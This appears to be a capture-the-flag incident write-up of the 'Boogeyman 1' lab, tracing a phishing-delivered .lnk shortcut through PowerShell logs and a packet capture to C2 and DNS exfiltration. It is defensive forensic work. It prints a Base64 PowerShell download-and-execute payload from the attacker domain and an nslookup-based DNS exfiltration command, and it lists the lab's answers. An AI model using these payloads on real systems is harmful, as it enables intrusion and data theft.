
1.Introduction

Report Introduction - Boogeyman 1, Threat Investigation

This investigation report documents the analysis of a multi-stage intrusion executed by an emerging threat actor group known as Boogeyman. targeting an enterprise workstation. The objective of this investigation is to trace the complete cyber kill chain—from initial access via targeted spear-phishing to post-exploitation actions, command-and-control (C2) communication, and data exfiltration.
Through detailed forensic analysis of email message files, Windows PowerShell Event Logs, and network packet captures, this report provides a comprehensive breakdown of the threat actor’s Tactics, Techniques, and Procedures (TTPs) aligned with the MITRE ATT&CK framework.

1.1 Scope and Environment of Investigation

The investigation was conducted within an isolated analysis virtual machine (/home/ubuntu/Desktop/artefacts) simulating a Security Operations Center (SOC) Level 1 triage workstation. The investigation was focused on the endpoint assigned to user Julianne Westcott (julianne.westcott@hotmail.com) following a suspicious email receipt.

Forensic Artifacts Analyzed

    - dump.eml: Raw RFC 822 formatted phishing email containing original headers and a Base64-encoded encrypted attachment.
    - powershell.json: JSON-formatted log collection extracted from Windows PowerShell Event Logs (Event ID 4104 - Script Block Logging) via evtx2json.
    - capture.pcapng: Complete network traffic capture recorded from the victim workstation during the active compromise window.


1.2.1 Tools and Technologies Applied.

The analysis relied on a combination of dedicated forensic tools and core Linux command-line utilities:


Primary Analysis Tools

    - Thunderbird: Graphical email client used for inspecting structured MIME components, message headers, and initial payload extraction.
    - LNKParse3: Forensic Python package used to parse and extract metadata, relative paths, and embedded command-line arguments from Windows shortcut (.lnk) binary files.
    - Wireshark & Tshark: GUI and CLI packet analysis engines used to inspect network streams, reconstruct HTTP/C2 transactions, and carve exfiltrated payloads.
    - jq: Lightweight command-line JSON processor used to query, filter, sort, and parse structured log entries within powershell.json.
    - Supporting Command-Line Utilities
    - grep / sed / awk: Used for rapid string searching, text manipulation, and filtering noisy execution logs.
    - base64: Used to decode embedded payloads from email attachments and obfuscated PowerShell commands.


2. Development.

2.1 Email Analysis & Initial Access Investigation

Task 1 - The Boogeyman is here!

  Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from a business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation. The security team flagged the suspicious execution of the attachment alongside reports from other finance department employees, indicating a targeted spear-phishing attack.

<img width="622" height="249" alt="Screen Shot 2026-09-01 at 15 52 01" src="https://github.com/user-attachments/assets/f6d359d4-9965-4908-815e-be2bbcf5d447" />

According to threat intelligence, the initial access vector and TTPs match those attributed to the emerging threat actor group named Boogeyman, known for targeting the logistics sector.
To analyze and assess the impact of this compromise, the investigation begins by inspecting the phishing email file (dump.eml) located in the /home/ubuntu/Desktop/artefacts directory. The analysis focuses on parsing the MIME headers, extracting the encrypted archive payload, and utilizing forensic tools such as Thunderbird and lnkparse to uncover the initial execution mechanism.

What is the email address used to send the phishing email?

Objective: Identify the sender's email address used by the attacker to deliver the phishing message.

Tool Used: Thunderbird Mail / dump.eml.

Analysis & Methodology: Opened the raw email file dump.eml using Thunderbird Mail to inspect the message headers (From: / Reply-To:).

Observed the From: header displaying the sender name "Arthur Griffin" along with the attacker's email domain address.

Response: agriffin@bpakcaging.xyz

<img width="963" height="524" alt="Screen Shot 2026-08-28 at 13 16 08" src="https://github.com/user-attachments/assets/ebeee2b4-9893-4e75-a17a-41eaf98c59f0" />

What is the email address of the victim?

Objective: Identify the recipient email address belonging to the victim.

Tool Used: Thunderbird Mail / dump.eml.

Analysis & Methodology: Inspected the recipient (To:) header field in Thunderbird. Verified that the email was directly addressed to Julianne Westcott in the finance department.

Response: julianne.westcott@hotmail.com

<img width="963" height="524" alt="Screen Shot 2026-08-28 at 13 18 19" src="https://github.com/user-attachments/assets/8b69f754-7afe-4fd2-a891-3a2a2b99472c" />

What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

Objective: Identify the third-party Email Service Provider (ESP) used by the attacker to send the phishing campaign.

Tool Used: Thunderbird (View Source / Raw Message Headers) / dump.eml.

Analysis & Methodology: Opened the raw source code of dump.eml to review the cryptographic authentication headers. Located the DKIM-Signature header field and identified the signing 

Response: elasticemail

<img <img width="843" height="350" alt="Screen Shot 2026-08-28 at 13 19 29" src="https://github.com/user-attachments/assets/a24b7943-6a75-4326-b969-f1563c4bcf96" />

<img width="774" height="533" alt="Screen Shot 2026-08-28 at 13 21 20" src="https://github.com/user-attachments/assets/e7d969b6-0152-49e6-8d16-b873af3f65bb" />

<img width="774" height="533" alt="Screen Shot 2026-08-28 at 13 21 20" src="https://github.com/user-attachments/assets/1a1c08af-f75c-408f-b067-25cfba5ba707" />

What is the name of the file inside the encrypted attachment?

Objective: Determine the filename of the payload encapsulated within the password-protected archive (Invoice.zip).

Tool Used: Linux Terminal / unzip.

Analysis & Methodology:  Saved the attached archive file Invoice.zip to /home/ubuntu/Desktop/artefacts. Executed the command unzip Invoice.zip in the command terminal, which prompted for the password and printed the filename being extracted.

Response: Invoice_20230103.lnk

<img width="795" height="209" alt="Screen Shot 2026-08-28 at 13 34 53" src="https://github.com/user-attachments/assets/7dcd9701-c2c6-4cca-9c99-e8eb3759b5ba" />

What is the password of the encrypted attachment?

Objective: Retrieve the decryption password required to open the attached zip archive.

Tool Used: Thunderbird Mail / dump.eml.

Analysis & Methodology: Examined the body text of the phishing email inside Thunderbird. Found the password directly embedded in the text: "You may use this code to view the encrypted file: Invoice2023!".

Response: Invoice2023!

<img width="622" height="249" alt="Screen Shot 2026-09-01 at 15 59 23" src="https://github.com/user-attachments/assets/ac1df0fd-a719-4ce1-a84b-4068b38aa57c" />

Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Objective: Extract the Base64-encoded command string hidden inside the Windows Shortcut (.lnk) binary file.

Tool Used: Linux Terminal / lnkparse (LNKParse3).

Analysis & Methodology: Ran lnkparse Invoice_20230103.lnk in the Linux terminal to parse shortcut metadata. Examined the output under the Command line arguments field, which showed powershell.exe execution with a hidden window style passing a Base64 string via the flag.

Response: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGIAcABhAGsAYwBhAGcAaQBuAGcALgB4AHkAegAvAG8AdQB0AC4AcABzADEAJwApAA==

<img width="795" height="411" alt="Screen Shot 2026-08-28 at 13 37 34" src="https://github.com/user-attachments/assets/f2b4f9a7-dbc0-421a-8967-db45a016ca54" />

<img width="795" height="210" alt="Screen Shot 2026-08-28 at 13 38 55" src="https://github.com/user-attachments/assets/b0b59c17-206f-46d9-96c2-c0c82da6c105" />

<img width="627" height="241" alt="Screen Shot 2026-09-01 at 16 01 54" src="https://github.com/user-attachments/assets/65d1bcf2-7054-44b1-866c-0f8d0c1d0a99" />

2.2 Endpoint Security - Are you sure what's an invoice?

Task 2 - Investigation Guide

Following the initial email compromise, the malicious shortcut (Invoice_20230103.lnk) executed a PowerShell command that initiated endpoint activity. To determine the extent of the post-exploitation phase and assess the damage to Julianne’s workstation, the investigation transitions into analyzing the PowerShell Event Logs stored in powershell.json.
Using jq to parse and filter structured log entries—specifically focusing on the ScriptBlockText field (Event ID 4104)—the analysis traces the attacker's activities, including host enumeration, sensitive database querying, staging of local credential vaults, and DNS-based data exfiltration.

What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

Objective: Identify the external infrastructure domains used by the threat group for payload hosting and Command & Control (C2) operations.

Tool Used: Linux Terminal / jq / grep.

Analysis & Methodology: Filtered the JSON log file powershell.json using jq and grep to extract all domain occurrences ending in .xyz. Executed cat powershell.json | jq -r '.. | strings' | grep -E -o '([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})' | grep -E '\.xyz$' to isolate the unique infrastructure hostnames. The command revealed the file hosting domain (files.bpakcaging.xyz) and C2 domain (cdn.bpakcaging.xyz).

Response: cdn.bpakcaging.xyz, files.bpakcaging.xyz

<img width="627" height="64" alt="Screen Shot 2026-09-01 at 16 02 40" src="https://github.com/user-attachments/assets/3f06b17e-f6f6-4035-9de3-3c5566e5155a" />

<img width="626" height="107" alt="Screen Shot 2026-09-01 at 16 03 04" src="https://github.com/user-attachments/assets/2a7e934d-585e-4c76-aef7-b21903bced2c" />

What is the name of the enumeration tool downloaded by the attacker?

Objective: Identify the host reconnaissance binary downloaded by the threat actor onto the endpoint.

Tool Used: Linux Terminal / jq / grep.

Analysis & Methodology: Queried the ScriptBlockText fields within powershell.json to inspect download actions executed by the attacker. Executed cat powershell.json | jq | grep -i "seatbelt" to inspect relevant PowerShell commands. Located script blocks pulling Invoke-Seatbelt.ps1 from GitHub and subsequently executing Seatbelt.exe -group=user;pwd.

Response: Seatbelt

<img width="624" height="196" alt="Screen Shot 2026-09-01 at 16 03 55" src="https://github.com/user-attachments/assets/d1c1b3da-43c0-4d4d-9b3f-e4efb055da82" />

What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

Objective: Determine the exact file path of the database file queried by the attacker using the portable SQLite tool (sq3.exe).

Tool Used: Linux Terminal / jq / grep.

Analysis & Methodology: Filtered powershell.json for string execution references containing sq3.exe. Executed cat powershell.json | jq | grep -i "sq3.exe" to reveal the command parameters and directory context. Found the script block executing .\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite. Combined with the working directory (C:\Users\j.westcott), the complete path with escaped backslashes was derived.

Response: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

<img width="624" height="101" alt="Screen Shot 2026-09-01 at 16 04 33" src="https://github.com/user-attachments/assets/67c149df-b3a0-4e6f-b251-913a06b31e1d" />

<img width="624" height="220" alt="Screen Shot 2026-09-01 at 16 04 52" src="https://github.com/user-attachments/assets/8ea44960-41a1-4258-ab4a-d5355f1859d1" />

What is the software that uses the file in Q3?

Objective: Identify the Windows application associated with the targeted SQLite database file (plum.sqlite).

Tool Used: PowerShell Log Analysis / System Intelligence.

Analysis&Methodology: Analyzed the package namespace Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe extracted from the target database path in Question 3. Verified that plum.sqlite is the local storage database format for the native Windows Sticky Notes application.

Response: Microsoft Sticky Notes

<img width="618" height="165" alt="Screen Shot 2026-09-01 at 16 05 39" src="https://github.com/user-attachments/assets/598544c2-2103-49ad-aee8-5bb936b46fcb" />

What is the name of the exfiltrated file?

Objective:Identify the filename of the sensitive local database targeted for exfiltration by the attacker.

Tool Used: Linux Terminal / jq / grep.

Analysis & Methodology: Filtered the PowerShell event logs for references to user document paths and variable assignments. Executed cat powershell.json | jq '{ScriptBlockText}' | grep "j.westcott" to isolate operations inside Julianne's user directories. Found the script block defining $file='C:\Users\j.westcott\Documents\protected_data.kdbx'.

Response: protected_data.kdbx

<img width="621" height="418" alt="Screen Shot 2026-09-01 at 16 06 18" src="https://github.com/user-attachments/assets/e7f5fab2-27f5-4e9b-af49-89eb0c658d9c" />

What type of file uses the .kdbx file extension?

Objective:Identify the file type associated with the .kdbx file format.

Tool Used: Web Intelligence / Technical Reference.

Analysis & Methodology: Queried standard file format specifications regarding .kdbx. Identified .kdbx as an encrypted password database format utilized by KeePass Password Safe.

Response: encrypted password database (or KeePass Password Safe)

<img width="621" height="195" alt="Screen Shot 2026-09-01 at 16 06 52" src="https://github.com/user-attachments/assets/2142736f-41d0-46ad-81ce-e38286aebcd4" />

What is the encoding used during the exfiltration attempt of the sensitive file?

Objective: Determine the data representation technique used to encode the contents of protected_data.kdbx before network transmission.

Tool Used: Linux Terminal / jq.

Analysis & Methodology: Analyzed the exfiltration script block in powershell.json where the $file is read into memory via [System.IO.File]: ReadAllBytes($file). Inspected the conversion routine transforming byte arrays to printable characters (ToString("X2")).

Response: hex

<img width="621" height="129" alt="Screen Shot 2026-09-01 at 16 07 27" src="https://github.com/user-attachments/assets/0fa3214b-4c85-44ed-9296-59ed268d0443" />

What is the tool used for exfiltration?

Objective: Identify the standard command-line network utility used by the script block to exfiltrate the encoded file data.

Tool Used: Linux Terminal / jq.

Analysis & Methodology: Examined the execution loop responsible for transmitting encoded string segments across the network. Identified DNS query operations issued sequentially to transmit data payloads.

Response: nslookup

<img width="621" height="131" alt="Screen Shot 2026-09-01 at 16 07 56" src="https://github.com/user-attachments/assets/02bf1a2c-eb15-496a-a52b-fbb5168c690c" />

2.3 Network Traffic Analysis 

Task 3 - They got us, and call the bank immediately.

Following the endpoint analysis of the PowerShell logs, the investigation proceeds to analyze the packet capture file (capture.pcapng) to observe the actual network traffic generated during the incident. Using Wireshark and tshark, the analysis traces HTTP/C2 communications, identifies payload hosting servers, analyzes exfiltration protocols, and reconstructs exfiltrated data files to extract compromise indicators and sensitive credentials.

What software is used by the attacker to host its presumed file/payload server?

Objective: Identify the web server software utilized on the payload hosting domain (files.bpakcaging.xyz).

Tool Used: Wireshark (http.host == files.bpakcaging.xyz).

Analysis & Methodology: Filtered HTTP traffic for requests directed to files.bpakcaging.xyz. Followed the HTTP stream for GET /update (TCP Stream 109). Inspected the HTTP response header Server: which returned Simple HTTP/0.6 Python/3.10.7.

Response: SimpleHTTP/0.6 Python/3.10.7

<img width="626" height="113" alt="Screen Shot 2026-09-01 at 16 08 40" src="https://github.com/user-attachments/assets/8f10713a-2549-404d-af25-9e8c22973932" />

<img width="626" height="128" alt="Screen Shot 2026-09-01 at 16 09 01" src="https://github.com/user-attachments/assets/b80dc4d1-a5f2-4579-95f6-77e725593d32" />

What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Objective:  Determine the HTTP request method used to send command output back to the C2 server (cdn.bpakcaging.xyz).

Tool Used: Wireshark (http.host contains cdn.bpakcaging.xyz).

Analysis & Methodology: Filtered traffic associated with the C2 domain cdn.bpakcaging.xyz.
Inspected packet #33288 (TCP stream 750) which sent command execution output to the endpoint /27fe2489. Verified the request line format: POST /27fe2489 HTTP/1.1.

Response: POST

<img width="626" height="100" alt="Screen Shot 2026-09-01 at 16 09 39" src="https://github.com/user-attachments/assets/40941a3d-ef77-4f6e-9e87-9d05d15043e3" />

What is the protocol used during the exfiltration activity?

Objective:  Identify the network protocol leveraged to transfer the encoded .kdbx file out of the network.

Tool Used: Linux Terminal / jq / Wireshark.

Analysis & Methodology: Analyzed the exfiltration script block: nslookup -q=A "$line.bpakcaging.xyz" $destination. Observed tshark query extraction capturing DNS A-record lookup queries containing chunked hex strings appended as subdomains.

Response: DNS

<img width="626" height="56" alt="Screen Shot 2026-09-01 at 16 10 23" src="https://github.com/user-attachments/assets/31646f9f-5939-4989-b88a-3558d5c2c546" />

What is the password of the exfiltrated file?

Objective:  Extract the Master Password stored within the exfiltrated Sticky Notes database (plum.sqlite).

Tool Used: Wireshark / CyberChef.

Analysis & Methodology: Located TCP Stream 750 carrying the HTTP POST response content containing decimal-formatted ASCII bytes of the queried Sticky Notes database. Pasted the decimal string into CyberChef using the From Decimal operation. Decoded the raw output string, revealing Master Password assigned to %p9^3!lL~Mz47E2GaT^y.

Response:  %p9^3!lL~Mz47E2GaT^y

<img width="622" height="452" alt="Screen Shot 2026-09-01 at 16 11 20" src="https://github.com/user-attachments/assets/8fb9208f-b48d-4f8a-9957-5f5ca7a6df8e" />

<img width="622" height="241" alt="Screen Shot 2026-09-01 at 16 11 41" src="https://github.com/user-attachments/assets/3cc80bdc-4eaa-496e-b535-3eb8dd8bccbe" />

What is the credit card number stored inside the exfiltrated file?

Objective: Reconstruct protected_data.kdbx from DNS exfiltration traffic, unlock it using the master password, and extract the stolen financial data.

Tool Used: tshark / Python (converter.py) / KeePass (or keepassxc-cli).

Analysis & Methodology: Extracted all hex-encoded DNS queries sent to bpakcaging.xyz using tshark. Executed converter.py to convert rawdata.bin via binascii.unhexlify() into binary format, reconstructing data.kdbx. Unlocked data.kdbx using the Master Password (%p9^3!lL~Mz47E2GaT^y)  and extracted the credit card entry.

Response:  4532015492830192

<img width="622" height="272" alt="Screen Shot 2026-09-01 at 16 12 17" src="https://github.com/user-attachments/assets/509f5c32-c338-4d50-b37b-1106e5174ca5" />

<img width="622" height="218" alt="Screen Shot 2026-09-01 at 16 12 57" src="https://github.com/user-attachments/assets/fb865ee8-3064-462d-bc6f-38b18c453d93" />

<img width="622" height="357" alt="Screen Shot 2026-09-01 at 16 13 15" src="https://github.com/user-attachments/assets/600a2ef6-bb7b-4747-ba06-26c7e25f34f5" />


3. Conclusion

The incident response investigation across Task 2 (Endpoint Security) and Task 3 (Network Traffic Analysis) successfully reconstructed the complete attack lifecycle following the initial phishing compromise.

- Attack Chain Reconstruction

      -- Initial Access & Execution
      
      
      The victim opened a malicious archive (Invoice.zip), leading to the execution of a shortcut file (Invoice_20230103.lnk).
      
      
      This triggered a PowerShell payload that established outbound connectivity to the attacker's staging infrastructure.


- Payload Staging & Host Reconnaissance


      Infrastructure: Payload hosting was maintained on files.bpakcaging.xyz using a Python HTTP server (SimpleHTTP/0.6 Python/3.10.7), while Command and Control (C2) operations were handled via cdn.bpakcaging.xyz over HTTP POST requests.
      
      
      Reconnaissance: The threat actor downloaded Invoke-Seatbelt.ps1 (Seatbelt) from GitHub to perform host enumeration under the user context j.westcott.
      
      
      Tool Staging: The attacker downloaded a portable SQLite tool (sq3.exe) from files.bpakcaging.xyz/sq3.exe to inspect local application databases.


- Data Access & Exfiltration


      Sticky Notes Access: Using sq3.exe, the attacker queried the Windows Sticky Notes database (plum.sqlite). Decoding the exfiltrated command output revealed a stored credential: the master password %p9^3!lL~Mz47E2GaT^y.
                  
                  
      KeePass Database Theft: The attacker located an encrypted password database (protected_data.kdbx) in C:\Users\j.westcott\Documents\.
                  
                  
      DNS Data Exfiltration: The .kdbx file was read into memory, converted into hexadecimal strings, split into 50-character chunks, and exfiltrated via DNS A record queries using 
            
            
      nslookup targeted at the C2 domain (.bpakcaging.xyz).


- Impact Assessment


      Reassembling the DNS exfiltration streams permitted full reconstruction of protected_data.kdbx.
      
      
      Unlocking the database with the extracted master password revealed compromised financial records, including sensitive payment card data (4532015492830192).

- Incident Artifact Summary

<img width="572" height="299" alt="Screen Shot 2026-09-01 at 16 24 13" src="https://github.com/user-attachments/assets/e299992c-9cd9-4347-a438-9b93cb4617d4" />



- Immediate Remediation Steps

      Financial Safeguards: Instantly block and reissue the compromised credit card (4532015492830192) and monitor financial accounts for unauthorized charges.
      
      Credential Resets: Force an immediate global password reset for user j.westcott and any accounts stored within the compromised KeePass vault.
      
      Network Isolation: Block all traffic to *.bpakcaging.xyz and associated C2 IP addresses (167.71.211.113, 159.89.205.40) at the perimeter firewall and DNS sinkhole.
      
      
      Host Remediation: Isolate workstation QL-WKSTN-5693 from the network, wipe the endpoint, and rebuild from a clean image.



























